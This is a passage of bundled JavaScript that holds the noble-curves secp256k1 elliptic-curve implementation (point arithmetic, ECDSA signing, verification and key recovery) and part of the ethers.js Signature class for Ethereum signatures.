          throw new Error("bad point: not in prime-order subgroup");
      }
      hasEvenY() {
        const { y } = this.toAffine();
        if (Fp2.isOdd)
          return !Fp2.isOdd(y);
        throw new Error("Field doesn't support isOdd");
      }
      /**
       * Compare one point to another.
       */
      equals(other) {
        assertPrjPoint(other);
        const { px: X1, py: Y1, pz: Z1 } = this;
        const { px: X2, py: Y2, pz: Z2 } = other;
        const U12 = Fp2.eql(Fp2.mul(X1, Z2), Fp2.mul(X2, Z1));
        const U22 = Fp2.eql(Fp2.mul(Y1, Z2), Fp2.mul(Y2, Z1));
        return U12 && U22;
      }
      /**
       * Flips point to one corresponding to (x, -y) in Affine coordinates.
       */
      negate() {
        return new Point2(this.px, Fp2.neg(this.py), this.pz);
      }
      // Renes-Costello-Batina exception-free doubling formula.
      // There is 30% faster Jacobian formula, but it is not complete.
      // https://eprint.iacr.org/2015/1060, algorithm 3
      // Cost: 8M + 3S + 3*a + 2*b3 + 15add.
      double() {
        const { a, b } = CURVE;
        const b3 = Fp2.mul(b, _3n2);
        const { px: X1, py: Y1, pz: Z1 } = this;
        let X3 = Fp2.ZERO, Y3 = Fp2.ZERO, Z3 = Fp2.ZERO;
        let t0 = Fp2.mul(X1, X1);
        let t1 = Fp2.mul(Y1, Y1);
        let t2 = Fp2.mul(Z1, Z1);
        let t3 = Fp2.mul(X1, Y1);
        t3 = Fp2.add(t3, t3);
        Z3 = Fp2.mul(X1, Z1);
        Z3 = Fp2.add(Z3, Z3);
        X3 = Fp2.mul(a, Z3);
        Y3 = Fp2.mul(b3, t2);
        Y3 = Fp2.add(X3, Y3);
        X3 = Fp2.sub(t1, Y3);
        Y3 = Fp2.add(t1, Y3);
        Y3 = Fp2.mul(X3, Y3);
        X3 = Fp2.mul(t3, X3);
        Z3 = Fp2.mul(b3, Z3);
        t2 = Fp2.mul(a, t2);
        t3 = Fp2.sub(t0, t2);
        t3 = Fp2.mul(a, t3);
        t3 = Fp2.add(t3, Z3);
        Z3 = Fp2.add(t0, t0);
        t0 = Fp2.add(Z3, t0);
        t0 = Fp2.add(t0, t2);
        t0 = Fp2.mul(t0, t3);
        Y3 = Fp2.add(Y3, t0);
        t2 = Fp2.mul(Y1, Z1);
        t2 = Fp2.add(t2, t2);
        t0 = Fp2.mul(t2, t3);
        X3 = Fp2.sub(X3, t0);
        Z3 = Fp2.mul(t2, t1);
        Z3 = Fp2.add(Z3, Z3);
        Z3 = Fp2.add(Z3, Z3);
        return new Point2(X3, Y3, Z3);
      }
      // Renes-Costello-Batina exception-free addition formula.
      // There is 30% faster Jacobian formula, but it is not complete.
      // https://eprint.iacr.org/2015/1060, algorithm 1
      // Cost: 12M + 0S + 3*a + 3*b3 + 23add.
      add(other) {
        assertPrjPoint(other);
        const { px: X1, py: Y1, pz: Z1 } = this;
        const { px: X2, py: Y2, pz: Z2 } = other;
        let X3 = Fp2.ZERO, Y3 = Fp2.ZERO, Z3 = Fp2.ZERO;
        const a = CURVE.a;
        const b3 = Fp2.mul(CURVE.b, _3n2);
        let t0 = Fp2.mul(X1, X2);
        let t1 = Fp2.mul(Y1, Y2);
        let t2 = Fp2.mul(Z1, Z2);
        let t3 = Fp2.add(X1, Y1);
        let t4 = Fp2.add(X2, Y2);
        t3 = Fp2.mul(t3, t4);
        t4 = Fp2.add(t0, t1);
        t3 = Fp2.sub(t3, t4);
        t4 = Fp2.add(X1, Z1);
        let t5 = Fp2.add(X2, Z2);
        t4 = Fp2.mul(t4, t5);
        t5 = Fp2.add(t0, t2);
        t4 = Fp2.sub(t4, t5);
        t5 = Fp2.add(Y1, Z1);
        X3 = Fp2.add(Y2, Z2);
        t5 = Fp2.mul(t5, X3);
        X3 = Fp2.add(t1, t2);
        t5 = Fp2.sub(t5, X3);
        Z3 = Fp2.mul(a, t4);
        X3 = Fp2.mul(b3, t2);
        Z3 = Fp2.add(X3, Z3);
        X3 = Fp2.sub(t1, Z3);
        Z3 = Fp2.add(t1, Z3);
        Y3 = Fp2.mul(X3, Z3);
        t1 = Fp2.add(t0, t0);
        t1 = Fp2.add(t1, t0);
        t2 = Fp2.mul(a, t2);
        t4 = Fp2.mul(b3, t4);
        t1 = Fp2.add(t1, t2);
        t2 = Fp2.sub(t0, t2);
        t2 = Fp2.mul(a, t2);
        t4 = Fp2.add(t4, t2);
        t0 = Fp2.mul(t1, t4);
        Y3 = Fp2.add(Y3, t0);
        t0 = Fp2.mul(t5, t4);
        X3 = Fp2.mul(t3, X3);
        X3 = Fp2.sub(X3, t0);
        t0 = Fp2.mul(t3, t1);
        Z3 = Fp2.mul(t5, Z3);
        Z3 = Fp2.add(Z3, t0);
        return new Point2(X3, Y3, Z3);
      }
      subtract(other) {
        return this.add(other.negate());
      }
      is0() {
        return this.equals(Point2.ZERO);
      }
      wNAF(n) {
        return wnaf.wNAFCached(this, pointPrecomputes, n, (comp) => {
          const toInv = Fp2.invertBatch(comp.map((p) => p.pz));
          return comp.map((p, i) => p.toAffine(toInv[i])).map(Point2.fromAffine);
        });
      }
      /**
       * Non-constant-time multiplication. Uses double-and-add algorithm.
       * It's faster, but should only be used when you don't care about
       * an exposed private key e.g. sig verification, which works over *public* keys.
       */
      multiplyUnsafe(n) {
        const I = Point2.ZERO;
        if (n === _0n5)
          return I;
        assertGE(n);
        if (n === _1n5)
          return this;
        const { endo } = CURVE;
        if (!endo)
          return wnaf.unsafeLadder(this, n);
        let { k1neg, k1, k2neg, k2 } = endo.splitScalar(n);
        let k1p = I;
        let k2p = I;
        let d = this;
        while (k1 > _0n5 || k2 > _0n5) {
          if (k1 & _1n5)
            k1p = k1p.add(d);
          if (k2 & _1n5)
            k2p = k2p.add(d);
          d = d.double();
          k1 >>= _1n5;
          k2 >>= _1n5;
        }
        if (k1neg)
          k1p = k1p.negate();
        if (k2neg)
          k2p = k2p.negate();
        k2p = new Point2(Fp2.mul(k2p.px, endo.beta), k2p.py, k2p.pz);
        return k1p.add(k2p);
      }
      /**
       * Constant time multiplication.
       * Uses wNAF method. Windowed method may be 10% faster,
       * but takes 2x longer to generate and consumes 2x memory.
       * Uses precomputes when available.
       * Uses endomorphism for Koblitz curves.
       * @param scalar by which the point would be multiplied
       * @returns New point
       */
      multiply(scalar) {
        assertGE(scalar);
        let n = scalar;
        let point, fake;
        const { endo } = CURVE;
        if (endo) {
          const { k1neg, k1, k2neg, k2 } = endo.splitScalar(n);
          let { p: k1p, f: f1p } = this.wNAF(k1);
          let { p: k2p, f: f2p } = this.wNAF(k2);
          k1p = wnaf.constTimeNegate(k1neg, k1p);
          k2p = wnaf.constTimeNegate(k2neg, k2p);
          k2p = new Point2(Fp2.mul(k2p.px, endo.beta), k2p.py, k2p.pz);
          point = k1p.add(k2p);
          fake = f1p.add(f2p);
        } else {
          const { p, f: f2 } = this.wNAF(n);
          point = p;
          fake = f2;
        }
        return Point2.normalizeZ([point, fake])[0];
      }
      /**
       * Efficiently calculate `aP + bQ`. Unsafe, can expose private key, if used incorrectly.
       * Not using Strauss-Shamir trick: precomputation tables are faster.
       * The trick could be useful if both P and Q are not G (not in our case).
       * @returns non-zero affine point
       */
      multiplyAndAddUnsafe(Q, a, b) {
        const G = Point2.BASE;
        const mul = (P, a2) => a2 === _0n5 || a2 === _1n5 || !P.equals(G) ? P.multiplyUnsafe(a2) : P.multiply(a2);
        const sum = mul(this, a).add(mul(Q, b));
        return sum.is0() ? void 0 : sum;
      }
      // Converts Projective point to affine (x, y) coordinates.
      // Can accept precomputed Z^-1 - for example, from invertBatch.
      // (x, y, z) ∋ (x=x/z, y=y/z)
      toAffine(iz) {
        const { px: x, py: y, pz: z } = this;
        const is0 = this.is0();
        if (iz == null)
          iz = is0 ? Fp2.ONE : Fp2.inv(z);
        const ax = Fp2.mul(x, iz);
        const ay = Fp2.mul(y, iz);
        const zz = Fp2.mul(z, iz);
        if (is0)
          return { x: Fp2.ZERO, y: Fp2.ZERO };
        if (!Fp2.eql(zz, Fp2.ONE))
          throw new Error("invZ was invalid");
        return { x: ax, y: ay };
      }
      isTorsionFree() {
        const { h: cofactor, isTorsionFree } = CURVE;
        if (cofactor === _1n5)
          return true;
        if (isTorsionFree)
          return isTorsionFree(Point2, this);
        throw new Error("isTorsionFree() has not been declared for the elliptic curve");
      }
      clearCofactor() {
        const { h: cofactor, clearCofactor } = CURVE;
        if (cofactor === _1n5)
          return this;
        if (clearCofactor)
          return clearCofactor(Point2, this);
        return this.multiplyUnsafe(CURVE.h);
      }
      toRawBytes(isCompressed = true) {
        this.assertValidity();
        return toBytes2(Point2, this, isCompressed);
      }
      toHex(isCompressed = true) {
        return bytesToHex(this.toRawBytes(isCompressed));
      }
    }
    Point2.BASE = new Point2(CURVE.Gx, CURVE.Gy, Fp2.ONE);
    Point2.ZERO = new Point2(Fp2.ZERO, Fp2.ONE, Fp2.ZERO);
    const _bits = CURVE.nBitLength;
    const wnaf = wNAF(Point2, CURVE.endo ? Math.ceil(_bits / 2) : _bits);
    return {
      CURVE,
      ProjectivePoint: Point2,
      normPrivateKeyToScalar,
      weierstrassEquation,
      isWithinCurveOrder
    };
  }
  function validateOpts(curve) {
    const opts = validateBasic(curve);
    validateObject(opts, {
      hash: "hash",
      hmac: "function",
      randomBytes: "function"
    }, {
      bits2int: "function",
      bits2int_modN: "function",
      lowS: "boolean"
    });
    return Object.freeze({ lowS: true, ...opts });
  }
  function weierstrass(curveDef) {
    const CURVE = validateOpts(curveDef);
    const { Fp: Fp2, n: CURVE_ORDER } = CURVE;
    const compressedLen = Fp2.BYTES + 1;
    const uncompressedLen = 2 * Fp2.BYTES + 1;
    function isValidFieldElement(num) {
      return _0n5 < num && num < Fp2.ORDER;
    }
    function modN(a) {
      return mod(a, CURVE_ORDER);
    }
    function invN(a) {
      return invert(a, CURVE_ORDER);
    }
    const { ProjectivePoint: Point2, normPrivateKeyToScalar, weierstrassEquation, isWithinCurveOrder } = weierstrassPoints({
      ...CURVE,
      toBytes(_c, point, isCompressed) {
        const a = point.toAffine();
        const x = Fp2.toBytes(a.x);
        const cat = concatBytes2;
        if (isCompressed) {
          return cat(Uint8Array.from([point.hasEvenY() ? 2 : 3]), x);
        } else {
          return cat(Uint8Array.from([4]), x, Fp2.toBytes(a.y));
        }
      },
      fromBytes(bytes2) {
        const len = bytes2.length;
        const head = bytes2[0];
        const tail = bytes2.subarray(1);
        if (len === compressedLen && (head === 2 || head === 3)) {
          const x = bytesToNumberBE(tail);
          if (!isValidFieldElement(x))
            throw new Error("Point is not on curve");
          const y2 = weierstrassEquation(x);
          let y = Fp2.sqrt(y2);
          const isYOdd = (y & _1n5) === _1n5;
          const isHeadOdd = (head & 1) === 1;
          if (isHeadOdd !== isYOdd)
            y = Fp2.neg(y);
          return { x, y };
        } else if (len === uncompressedLen && head === 4) {
          const x = Fp2.fromBytes(tail.subarray(0, Fp2.BYTES));
          const y = Fp2.fromBytes(tail.subarray(Fp2.BYTES, 2 * Fp2.BYTES));
          return { x, y };
        } else {
          throw new Error(`Point of length ${len} was invalid. Expected ${compressedLen} compressed bytes or ${uncompressedLen} uncompressed bytes`);
        }
      }
    });
    const numToNByteStr = (num) => bytesToHex(numberToBytesBE(num, CURVE.nByteLength));
    function isBiggerThanHalfOrder(number2) {
      const HALF = CURVE_ORDER >> _1n5;
      return number2 > HALF;
    }
    function normalizeS(s) {
      return isBiggerThanHalfOrder(s) ? modN(-s) : s;
    }
    const slcNum = (b, from, to) => bytesToNumberBE(b.slice(from, to));
    class Signature2 {
      constructor(r, s, recovery) {
        this.r = r;
        this.s = s;
        this.recovery = recovery;
        this.assertValidity();
      }
      // pair (bytes of r, bytes of s)
      static fromCompact(hex) {
        const l = CURVE.nByteLength;
        hex = ensureBytes("compactSignature", hex, l * 2);
        return new Signature2(slcNum(hex, 0, l), slcNum(hex, l, 2 * l));
      }
      // DER encoded ECDSA signature
      // https://bitcoin.stackexchange.com/questions/57644/what-are-the-parts-of-a-bitcoin-transaction-input-script
      static fromDER(hex) {
        const { r, s } = DER.toSig(ensureBytes("DER", hex));
        return new Signature2(r, s);
      }
      assertValidity() {
        if (!isWithinCurveOrder(this.r))
          throw new Error("r must be 0 < r < CURVE.n");
        if (!isWithinCurveOrder(this.s))
          throw new Error("s must be 0 < s < CURVE.n");
      }
      addRecoveryBit(recovery) {
        return new Signature2(this.r, this.s, recovery);
      }
      recoverPublicKey(msgHash) {
        const { r, s, recovery: rec } = this;
        const h = bits2int_modN(ensureBytes("msgHash", msgHash));
        if (rec == null || ![0, 1, 2, 3].includes(rec))
          throw new Error("recovery id invalid");
        const radj = rec === 2 || rec === 3 ? r + CURVE.n : r;
        if (radj >= Fp2.ORDER)
          throw new Error("recovery id 2 or 3 invalid");
        const prefix = (rec & 1) === 0 ? "02" : "03";
        const R = Point2.fromHex(prefix + numToNByteStr(radj));
        const ir = invN(radj);
        const u1 = modN(-h * ir);
        const u2 = modN(s * ir);
        const Q = Point2.BASE.multiplyAndAddUnsafe(R, u1, u2);
        if (!Q)
          throw new Error("point at infinify");
        Q.assertValidity();
        return Q;
      }
      // Signatures should be low-s, to prevent malleability.
      hasHighS() {
        return isBiggerThanHalfOrder(this.s);
      }
      normalizeS() {
        return this.hasHighS() ? new Signature2(this.r, modN(-this.s), this.recovery) : this;
      }
      // DER-encoded
      toDERRawBytes() {
        return hexToBytes(this.toDERHex());
      }
      toDERHex() {
        return DER.hexFromSig({ r: this.r, s: this.s });
      }
      // padded bytes of r, then padded bytes of s
      toCompactRawBytes() {
        return hexToBytes(this.toCompactHex());
      }
      toCompactHex() {
        return numToNByteStr(this.r) + numToNByteStr(this.s);
      }
    }
    const utils = {
      isValidPrivateKey(privateKey) {
        try {
          normPrivateKeyToScalar(privateKey);
          return true;
        } catch (error) {
          return false;
        }
      },
      normPrivateKeyToScalar,
      /**
       * Produces cryptographically secure private key from random of size
       * (groupLen + ceil(groupLen / 2)) with modulo bias being negligible.
       */
      randomPrivateKey: () => {
        const length = getMinHashLength(CURVE.n);
        return mapHashToField(CURVE.randomBytes(length), CURVE.n);
      },
      /**
       * Creates precompute table for an arbitrary EC point. Makes point "cached".
       * Allows to massively speed-up `point.multiply(scalar)`.
       * @returns cached point
       * @example
       * const fast = utils.precompute(8, ProjectivePoint.fromHex(someonesPubKey));
       * fast.multiply(privKey); // much faster ECDH now
       */
      precompute(windowSize = 8, point = Point2.BASE) {
        point._setWindowSize(windowSize);
        point.multiply(BigInt(3));
        return point;
      }
    };
    function getPublicKey(privateKey, isCompressed = true) {
      return Point2.fromPrivateKey(privateKey).toRawBytes(isCompressed);
    }
    function isProbPub(item) {
      const arr = item instanceof Uint8Array;
      const str = typeof item === "string";
      const len = (arr || str) && item.length;
      if (arr)
        return len === compressedLen || len === uncompressedLen;
      if (str)
        return len === 2 * compressedLen || len === 2 * uncompressedLen;
      if (item instanceof Point2)
        return true;
      return false;
    }
    function getSharedSecret(privateA, publicB, isCompressed = true) {
      if (isProbPub(privateA))
        throw new Error("first arg must be private key");
      if (!isProbPub(publicB))
        throw new Error("second arg must be public key");
      const b = Point2.fromHex(publicB);
      return b.multiply(normPrivateKeyToScalar(privateA)).toRawBytes(isCompressed);
    }
    const bits2int = CURVE.bits2int || function(bytes2) {
      const num = bytesToNumberBE(bytes2);
      const delta = bytes2.length * 8 - CURVE.nBitLength;
      return delta > 0 ? num >> BigInt(delta) : num;
    };
    const bits2int_modN = CURVE.bits2int_modN || function(bytes2) {
      return modN(bits2int(bytes2));
    };
    const ORDER_MASK = bitMask(CURVE.nBitLength);
    function int2octets(num) {
      if (typeof num !== "bigint")
        throw new Error("bigint expected");
      if (!(_0n5 <= num && num < ORDER_MASK))
        throw new Error(`bigint expected < 2^${CURVE.nBitLength}`);
      return numberToBytesBE(num, CURVE.nByteLength);
    }
    function prepSig(msgHash, privateKey, opts = defaultSigOpts) {
      if (["recovered", "canonical"].some((k) => k in opts))
        throw new Error("sign() legacy options not supported");
      const { hash: hash2, randomBytes: randomBytes4 } = CURVE;
      let { lowS, prehash, extraEntropy: ent } = opts;
      if (lowS == null)
        lowS = true;
      msgHash = ensureBytes("msgHash", msgHash);
      if (prehash)
        msgHash = ensureBytes("prehashed msgHash", hash2(msgHash));
      const h1int = bits2int_modN(msgHash);
      const d = normPrivateKeyToScalar(privateKey);
      const seedArgs = [int2octets(d), int2octets(h1int)];
      if (ent != null) {
        const e = ent === true ? randomBytes4(Fp2.BYTES) : ent;
        seedArgs.push(ensureBytes("extraEntropy", e));
      }
      const seed = concatBytes2(...seedArgs);
      const m = h1int;
      function k2sig(kBytes) {
        const k = bits2int(kBytes);
        if (!isWithinCurveOrder(k))
          return;
        const ik = invN(k);
        const q = Point2.BASE.multiply(k).toAffine();
        const r = modN(q.x);
        if (r === _0n5)
          return;
        const s = modN(ik * modN(m + r * d));
        if (s === _0n5)
          return;
        let recovery = (q.x === r ? 0 : 2) | Number(q.y & _1n5);
        let normS = s;
        if (lowS && isBiggerThanHalfOrder(s)) {
          normS = normalizeS(s);
          recovery ^= 1;
        }
        return new Signature2(r, normS, recovery);
      }
      return { seed, k2sig };
    }
    const defaultSigOpts = { lowS: CURVE.lowS, prehash: false };
    const defaultVerOpts = { lowS: CURVE.lowS, prehash: false };
    function sign(msgHash, privKey, opts = defaultSigOpts) {
      const { seed, k2sig } = prepSig(msgHash, privKey, opts);
      const C = CURVE;
      const drbg = createHmacDrbg(C.hash.outputLen, C.nByteLength, C.hmac);
      return drbg(seed, k2sig);
    }
    Point2.BASE._setWindowSize(8);
    function verify(signature, msgHash, publicKey, opts = defaultVerOpts) {
      const sg = signature;
      msgHash = ensureBytes("msgHash", msgHash);
      publicKey = ensureBytes("publicKey", publicKey);
      if ("strict" in opts)
        throw new Error("options.strict was renamed to lowS");
      const { lowS, prehash } = opts;
      let _sig = void 0;
      let P;
      try {
        if (typeof sg === "string" || sg instanceof Uint8Array) {
          try {
            _sig = Signature2.fromDER(sg);
          } catch (derError) {
            if (!(derError instanceof DER.Err))
              throw derError;
            _sig = Signature2.fromCompact(sg);
          }
        } else if (typeof sg === "object" && typeof sg.r === "bigint" && typeof sg.s === "bigint") {
          const { r: r2, s: s2 } = sg;
          _sig = new Signature2(r2, s2);
        } else {
          throw new Error("PARSE");
        }
        P = Point2.fromHex(publicKey);
      } catch (error) {
        if (error.message === "PARSE")
          throw new Error(`signature must be Signature instance, Uint8Array or hex string`);
        return false;
      }
      if (lowS && _sig.hasHighS())
        return false;
      if (prehash)
        msgHash = CURVE.hash(msgHash);
      const { r, s } = _sig;
      const h = bits2int_modN(msgHash);
      const is = invN(s);
      const u1 = modN(h * is);
      const u2 = modN(r * is);
      const R = Point2.BASE.multiplyAndAddUnsafe(P, u1, u2)?.toAffine();
      if (!R)
        return false;
      const v = modN(R.x);
      return v === r;
    }
    return {
      CURVE,
      getPublicKey,
      getSharedSecret,
      sign,
      verify,
      ProjectivePoint: Point2,
      Signature: Signature2,
      utils
    };
  }

  // node_modules/@noble/curves/esm/_shortw_utils.js
  function getHash(hash2) {
    return {
      hash: hash2,
      hmac: (key, ...msgs) => hmac(hash2, key, concatBytes(...msgs)),
      randomBytes
    };
  }
  function createCurve(curveDef, defHash) {
    const create = (hash2) => weierstrass({ ...curveDef, ...getHash(hash2) });
    return Object.freeze({ ...create(defHash), create });
  }

  // node_modules/@noble/curves/esm/secp256k1.js
  var secp256k1P = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f");
  var secp256k1N = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
  var _1n6 = BigInt(1);
  var _2n5 = BigInt(2);
  var divNearest = (a, b) => (a + b / _2n5) / b;
  function sqrtMod(y) {
    const P = secp256k1P;
    const _3n3 = BigInt(3), _6n = BigInt(6), _11n = BigInt(11), _22n = BigInt(22);
    const _23n = BigInt(23), _44n = BigInt(44), _88n = BigInt(88);
    const b2 = y * y * y % P;
    const b3 = b2 * b2 * y % P;
    const b6 = pow2(b3, _3n3, P) * b3 % P;
    const b9 = pow2(b6, _3n3, P) * b3 % P;
    const b11 = pow2(b9, _2n5, P) * b2 % P;
    const b22 = pow2(b11, _11n, P) * b11 % P;
    const b44 = pow2(b22, _22n, P) * b22 % P;
    const b88 = pow2(b44, _44n, P) * b44 % P;
    const b176 = pow2(b88, _88n, P) * b88 % P;
    const b220 = pow2(b176, _44n, P) * b44 % P;
    const b223 = pow2(b220, _3n3, P) * b3 % P;
    const t1 = pow2(b223, _23n, P) * b22 % P;
    const t2 = pow2(t1, _6n, P) * b2 % P;
    const root = pow2(t2, _2n5, P);
    if (!Fp.eql(Fp.sqr(root), y))
      throw new Error("Cannot find square root");
    return root;
  }
  var Fp = Field(secp256k1P, void 0, void 0, { sqrt: sqrtMod });
  var secp256k1 = createCurve({
    a: BigInt(0),
    b: BigInt(7),
    Fp,
    n: secp256k1N,
    // Base point (x, y) aka generator point
    Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
    Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
    h: BigInt(1),
    lowS: true,
    /**
     * secp256k1 belongs to Koblitz curves: it has efficiently computable endomorphism.
     * Endomorphism uses 2x less RAM, speeds up precomputation by 2x and ECDH / key recovery by 20%.
     * For precomputed wNAF it trades off 1/2 init time & 1/3 ram for 20% perf hit.
     * Explanation: https://gist.github.com/paulmillr/eb670806793e84df628a7c434a873066
     */
    endo: {
      beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
      splitScalar: (k) => {
        const n = secp256k1N;
        const a1 = BigInt("0x3086d221a7d46bcde86c90e49284eb15");
        const b1 = -_1n6 * BigInt("0xe4437ed6010e88286f547fa90abfe4c3");
        const a2 = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8");
        const b2 = a1;
        const POW_2_128 = BigInt("0x100000000000000000000000000000000");
        const c1 = divNearest(b2 * k, n);
        const c2 = divNearest(-b1 * k, n);
        let k1 = mod(k - c1 * a1 - c2 * a2, n);
        let k2 = mod(-c1 * b1 - c2 * b2, n);
        const k1neg = k1 > POW_2_128;
        const k2neg = k2 > POW_2_128;
        if (k1neg)
          k1 = n - k1;
        if (k2neg)
          k2 = n - k2;
        if (k1 > POW_2_128 || k2 > POW_2_128) {
          throw new Error("splitScalar: Endomorphism failed, k=" + k);
        }
        return { k1neg, k1, k2neg, k2 };
      }
    }
  }, sha256);
  var _0n6 = BigInt(0);
  var Point = secp256k1.ProjectivePoint;

  // node_modules/ethers/lib.esm/constants/addresses.js
  var ZeroAddress = "0x0000000000000000000000000000000000000000";

  // node_modules/ethers/lib.esm/constants/hashes.js
  var ZeroHash = "0x0000000000000000000000000000000000000000000000000000000000000000";

  // node_modules/ethers/lib.esm/constants/strings.js
  var MessagePrefix = "Ethereum Signed Message:\n";

  // node_modules/ethers/lib.esm/crypto/signature.js
  var BN_03 = BigInt(0);
  var BN_12 = BigInt(1);
  var BN_2 = BigInt(2);
  var BN_27 = BigInt(27);
  var BN_28 = BigInt(28);
  var BN_35 = BigInt(35);
  var BN_N = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
  var BN_N_2 = BN_N / BN_2;
  var inspect = /* @__PURE__ */ Symbol.for("nodejs.util.inspect.custom");
  var _guard = {};
  function toUint256(value) {
    return zeroPadValue(toBeArray(value), 32);
  }
  var Signature = class _Signature {
    #r;
    #s;
    #v;
    #networkV;
    /**
     *  The ``r`` value for a signature.
     *
     *  This represents the ``x`` coordinate of a "reference" or
     *  challenge point, from which the ``y`` can be computed.
     */
    get r() {
      return this.#r;
    }
    set r(value) {
      assertArgument(dataLength(value) === 32, "invalid r", "value", value);
      this.#r = hexlify(value);
    }
    /**
     *  The ``s`` value for a signature.
     */
    get s() {
      assertArgument(parseInt(this.#s.substring(0, 3)) < 8, "non-canonical s; use ._s", "s", this.#s);
      return this.#s;
    }
    set s(_value) {
      assertArgument(dataLength(_value) === 32, "invalid s", "value", _value);
      this.#s = hexlify(_value);
    }
    /**
     *  Return the s value, unchecked for EIP-2 compliance.
     *
     *  This should generally not be used and is for situations where
     *  a non-canonical S value might be relevant, such as Frontier blocks
     *  that were mined prior to EIP-2 or invalid Authorization List
     *  signatures.
     */
    get _s() {
      return this.#s;
    }
    /**
     *  Returns true if the Signature is valid for [[link-eip-2]] signatures.
     */
    isValid() {
      const s = BigInt(this.#s);
      return s <= BN_N_2;
    }
    /**
     *  The ``v`` value for a signature.
     *
     *  Since a given ``x`` value for ``r`` has two possible values for
     *  its correspondin ``y``, the ``v`` indicates which of the two ``y``
     *  values to use.
     *
     *  It is normalized to the values ``27`` or ``28`` for legacy
     *  purposes.
     */
    get v() {
      return this.#v;
    }
    set v(value) {
      const v = getNumber(value, "value");
      assertArgument(v === 27 || v === 28, "invalid v", "v", value);
      this.#v = v;
    }
    /**
     *  The EIP-155 ``v`` for legacy transactions. For non-legacy
     *  transactions, this value is ``null``.
     */
    get networkV() {
      return this.#networkV;
    }
    /**
     *  The chain ID for EIP-155 legacy transactions. For non-legacy
     *  transactions, this value is ``null``.
     */
    get legacyChainId() {
      const v = this.networkV;
      if (v == null) {
        return null;
      }
      return _Signature.getChainId(v);
    }
    /**
     *  The ``yParity`` for the signature.
     *
     *  See ``v`` for more details on how this value is used.
     */
    get yParity() {
      return this.v === 27 ? 0 : 1;
    }
    /**
     *  The [[link-eip-2098]] compact representation of the ``yParity``
     *  and ``s`` compacted into a single ``bytes32``.
     */
    get yParityAndS() {
      const yParityAndS = getBytes(this.s);
      if (this.yParity) {
        yParityAndS[0] |= 128;
      }
      return hexlify(yParityAndS);
    }
    /**
     *  The [[link-eip-2098]] compact representation.
     */
    get compactSerialized() {
      return concat([this.r, this.yParityAndS]);
    }
    /**
     *  The serialized representation.
     */
    get serialized() {
      return concat([this.r, this.s, this.yParity ? "0x1c" : "0x1b"]);
    }
    /**
     *  @private
     */
    constructor(guard, r, s, v) {
      assertPrivate(guard, _guard, "Signature");
      this.#r = r;
      this.#s = s;
      this.#v = v;
      this.#networkV = null;
    }
    /**
     *  Returns the canonical signature.
     *
     *  This is only necessary when dealing with legacy transaction which
     *  did not enforce canonical S values (i.e. [[link-eip-2]]. Most
     *  developers should never require this.
     */
    getCanonical() {
      if (this.isValid()) {
        return this;
      }
      const s = BN_N - BigInt(this._s);
      const v = 55 - this.v;
      const result = new _Signature(_guard, this.r, toUint256(s), v);
      if (this.networkV) {
        result.#networkV = this.networkV;
      }
      return result;
    }
    /**
     *  Returns a new identical [[Signature]].
     */
    clone() {
      const clone = new _Signature(_guard, this.r, this._s, this.v);
      if (this.networkV) {
        clone.#networkV = this.networkV;
      }
      return clone;
    }
    /**
     *  Returns a representation that is compatible with ``JSON.stringify``.
     */
    toJSON() {
      const networkV = this.networkV;
      return {
        _type: "signature",
        networkV: networkV != null ? networkV.toString() : null,
        r: this.r,
        s: this._s,
        v: this.v
      };
    }
    [inspect]() {
      return this.toString();
    }
    toString() {
      if (this.isValid()) {
        return `Signature { r: ${this.r}, s: ${this._s}, v: ${this.v} }`;
      }
      return `Signature { r: ${this.r}, s: ${this._s}, v: ${this.v}, valid: false }`;
    }
    /**
     *  Compute the chain ID from the ``v`` in a legacy EIP-155 transactions.
     *
     *  @example:
     *    Signature.getChainId(45)
     *    //_result:
     *
     *    Signature.getChainId(46)
     *    //_result:
     */
    static getChainId(v) {
      const bv = getBigInt(v, "v");
      if (bv == BN_27 || bv == BN_28) {
        return BN_03;
      }
      assertArgument(bv >= BN_35, "invalid EIP-155 v", "v", v);
      return (bv - BN_35) / BN_2;
    }
    /**
     *  Compute the ``v`` for a chain ID for a legacy EIP-155 transactions.
     *
     *  Legacy transactions which use [[link-eip-155]] hijack the ``v``
     *  property to include the chain ID.
     *
     *  @example:
     *    Signature.getChainIdV(5, 27)
     *    //_result:
     *
     *    Signature.getChainIdV(5, 28)
     *    //_result:
     *
     */
    static getChainIdV(chainId, v) {
      return getBigInt(chainId) * BN_2 + BigInt(35 + v - 27);
    }
    /**
     *  Compute the normalized legacy transaction ``v`` from a ``yParirty``,
     *  a legacy transaction ``v`` or a legacy [[link-eip-155]] transaction.
     *
     *  @example:
     *    // The values 0 and 1 imply v is actually yParity
     *    Signature.getNormalizedV(0)
     *    //_result:
     *
     *    // Legacy non-EIP-1559 transaction (i.e. 27 or 28)
     *    Signature.getNormalizedV(27)
     *    //_result:
     *
     *    // Legacy EIP-155 transaction (i.e. >= 35)
     *    Signature.getNormalizedV(46)
     *    //_result:
     *
     *    // Invalid values throw
     *    Signature.getNormalizedV(5)
     *    //_error:
     */
    static getNormalizedV(v) {
      const bv = getBigInt(v);
      if (bv === BN_03 || bv === BN_27) {
        return 27;
      }
      if (bv === BN_12 || bv === BN_28) {
        return 28;
      }
      assertArgument(bv >= BN_35, "invalid v", "v", v);
      return bv & BN_12 ? 27 : 28;
    }
    /**
     *  Creates a new [[Signature]].
     *
     *  If no %%sig%% is provided, a new [[Signature]] is created
     *  with default values.
     *
     *  If %%sig%% is a string, it is parsed.
     */
    static from(sig) {
      function assertError(check, message) {
        assertArgument(check, message, "signature", sig);
      }
      ;
      if (sig == null) {
        return new _Signature(_guard, ZeroHash, ZeroHash, 27);
      }
      if (typeof sig === "string") {
        const bytes2 = getBytes(sig, "signature");
        if (bytes2.length === 64) {
          const r2 = hexlify(bytes2.slice(0, 32));
          const s2 = bytes2.slice(32, 64);
          const v2 = s2[0] & 128 ? 28 : 27;
          s2[0] &= 127;
          return new _Signature(_guard, r2, hexlify(s2), v2);
        }
        if (bytes2.length === 65) {
          const r2 = hexlify(bytes2.slice(0, 32));
          const s2 = hexlify(bytes2.slice(32, 64));
